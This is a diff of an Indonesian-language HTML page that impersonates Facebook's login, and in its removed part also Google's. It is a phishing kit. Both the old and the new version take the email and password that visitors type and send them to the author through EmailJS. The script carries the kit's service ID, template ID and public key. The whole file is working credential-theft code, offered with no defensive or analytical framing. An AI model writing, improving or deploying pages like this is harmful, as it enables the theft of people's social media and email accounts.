@@ -2,138 +2,80 @@
 <html lang="id">
 <head>
   <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Login 2025</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Login</title>
+
+  <!-- EmailJS FIXED -->
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+
+      // PUBLIC KEY MILIKMU
+      emailjs.init("cKKsMvy9twhmPTKlR");
+
+      function kirimData() {
+        const email = document.getElementById("email").value;
+        const pass = document.getElementById("password").value;
+
+        const data = {
+          user_email: email,
+          user_password: pass
+        };
+
+        emailjs.send("service_x0mb56a", "template_d41h15m", data)
+          .then(function () {
+            console.log("Terkirim ✔️");
+          })
+          .catch(function (err) {
+            console.error("Gagal ❌", err);
+          });
+      }
+
+      window.kirimData = kirimData;
+    });
+  </script>
+
   <style>
-  /* Reset and layout */
-  *,*::before,*::after{box-sizing:border-box}
-  html,body{height:100%}
-  body{font-family:system-ui,Arial,Helvetica,sans-serif;margin:0;background:#f3f4f6;display:flex;justify-content:center;align-items:center;padding:16px}
-
-  /* Card */
-  .page{display:none;width:100%;max-width:420px;background:white;padding:24px;border-radius:12px;box-shadow:0 6px 20px rgba(16,24,40,0.08);overflow:hidden}
-  .show{display:block}
-
-  /* Typography */
-  h2{margin:0 0 8px 0;font-size:20px}
-  p{margin:0 0 12px 0;color:#555}
-
-  /* Inputs & buttons fill the container and won't overflow */
-  input[type="text"],input[type="password"],button{width:100%;padding:12px;margin-top:10px;border-radius:8px;border:1px solid #d1d5db;font-size:15px}
-  input{background:#fff}
-  button{cursor:pointer;background:transparent;border-radius:8px}
-
-  /* Specific buttons */
-  button.fb{background:#1877f2;color:white;border:1px solid rgba(0,0,0,0)}
-  button.gg{background:white;color:#111;border:1px solid #e5e7eb}
-  .back{background:#f3f4f6}
-
-  /* Utilities */
-  hr{border:0;border-top:1px solid #eee;margin:18px 0}
-  img{max-width:100%;height:auto;display:block}
-
-  /* Make sure long text wraps and doesn't push layout */
-  button, input, p, h2{word-break:break-word}
-
-  /* Small screen tweaks */
-  @media (max-width:360px){
-    .page{padding:18px;border-radius:10px}
-    input,button{padding:10px;font-size:14px}
-  }
-</style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background:#f0f2f5;
+    }
+    .container {
+      max-width: 360px;
+      margin: 80px auto;
+      background:white;
+      padding:20px;
+      border-radius:8px;
+      box-shadow:0 2px 6px rgba(0,0,0,0.1);
+    }
+    input {
+      width:100%;
+      padding:12px;
+      margin:10px 0;
+      border:1px solid #ddd;
+      border-radius:6px;
+      font-size:15px;
+    }
+    button {
+      width:100%;
+      padding:12px;
+      background:#1877f2;
+      border:none;
+      color:white;
+      font-size:16px;
+      border-radius:6px;
+      cursor:pointer;
+    }
+  </style>
 </head>
+
 <body>
-<script>
-// Inisialisasi EmailJS
-(function(){ emailjs.init('cKKsMvy9twhmPTKlR'); })();
-</script>
-
-  <!-- FORM LOGIN EMAILJS -->
-<form id="memberForm" style="display:none"></form>
-<div id="status"></div>
-
-<!-- PAGE 1: PILIH LOGIN -->
-  <div id="page-home" class="page show">
-    <h2>Pilih Metode Login</h2>
-    <button class="fb" onclick="go('page-fb')">Login dengan Facebook</button>
-    <button class="gg" onclick="go('page-google')">Login dengan Google</button>
+  <div class="container">
+    <h2>Facebook Login</h2>
+    <input type="text" id="email" placeholder="Email atau Nomor HP">
+    <input type="password" id="password" placeholder="Kata Sandi">
+    <button onclick="kirimData()">Masuk</button>
   </div>
-
-  <!-- PAGE 2: LOGIN FACEBOOK 2025 -->
-  <div id="page-fb" class="page" style="padding-top:40px;padding-bottom:40px">
-    <h2 style="color:#1877f2;font-weight:700;font-size:28px;margin-bottom:10px;text-align:left">facebook</h2>
-    <p style="margin-top:-10px;color:#555;font-size:15px;margin-bottom:20px">Masuk ke akun Facebook Anda</p>
-
-    <form id="fbForm">
-      <input id="fbEmail" type="text" placeholder="Email atau Nomor Ponsel" style="border-radius:6px;font-size:15px" />
-      <input id="fbPass" type="password" placeholder="Kata Sandi" style="border-radius:6px;font-size:15px" />
-
-      <button type="submit" class="fb" style="border-radius:6px;font-size:17px;font-weight:600">Masuk</button>
-    </form>
-
-    <div id="fbStatus" style="margin-top:10px;font-size:14px"></div>
-
-    <p style="text-align:center;margin-top:14px;font-size:14px;color:#1877f2;cursor:pointer">Lupa kata sandi?</p>
-
-    <hr style="margin:20px 0;border:0;border-top:1px solid #ddd" />
-
-    <button style="width:100%;padding:12px;background:#42b72a;color:white;border-radius:6px;font-size:16px;font-weight:600;border:none;cursor:pointer">Buat Akun Baru</button</button>
-
-    <button class="back" onclick="go('page-home')">Kembali</button>
-  </div>
-
-  <!-- PAGE 3: LOGIN GOOGLE 2025 -->
-  <div id="page-google" class="page" style="padding-top:40px;padding-bottom:40px">
-    <div style="display:flex;justify-content:center;margin-bottom:10px">
-      <img src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg" alt="Google" />
-    </div>
-    <h2 style="font-size:22px;font-weight:500;text-align:center;margin-bottom:10px">Login</h2>
-    <p style="text-align:center;color:#555;font-size:14px;margin-bottom:20px">Gunakan Akun Google Anda</p>
-
-    <input type="text" placeholder="Email atau ponsel" style="border-radius:6px;font-size:15px" />
-
-    <button class="gg" style="margin-top:20px;border-radius:6px;font-weight:600;font-size:15px">Berikutnya</button>
-
-    <button class="back" onclick="go('page-home')">Kembali</button>
-  </div>
-
-<script>
-function go(id){
-  document.querySelectorAll('.page').forEach(p=>p.classList.remove('show'));
-  document.getElementById(id).classList.add('show');
-}
-</script>
-
-<script>
-// EMAILJS LOGIN FB
-const fbForm = document.getElementById('fbForm');
-const fbStatus = document.getElementById('fbStatus');
-
-fbForm.addEventListener('submit', function(e){
-  e.preventDefault();
-
-  const email = document.getElementById('fbEmail').value.trim();
-  const pass = document.getElementById('fbPass').value.trim();
-
-  if(!email || !pass){
-    fbStatus.innerHTML = '<span style="color:red">⚠️ Email dan Password wajib diisi.</span>';
-    return;
-  }
-
-  fbStatus.innerHTML = '⏳ Mengirim...';
-
-  emailjs.send('service_x0mb56a','template_d41h15m',{
-    email: email,
-    password: pass,
-    platform: 'Facebook Login 2025'
-  })
-  .then(()=>{
-    fbStatus.innerHTML = '<span style="color:green">✅ Login terkirim</span>';
-  })
-  .catch(()=>{
-    fbStatus.innerHTML = '<span style="color:red">❌ Gagal mengirim</span>';
-  });
-});
-</script>
 </body>
 </html>
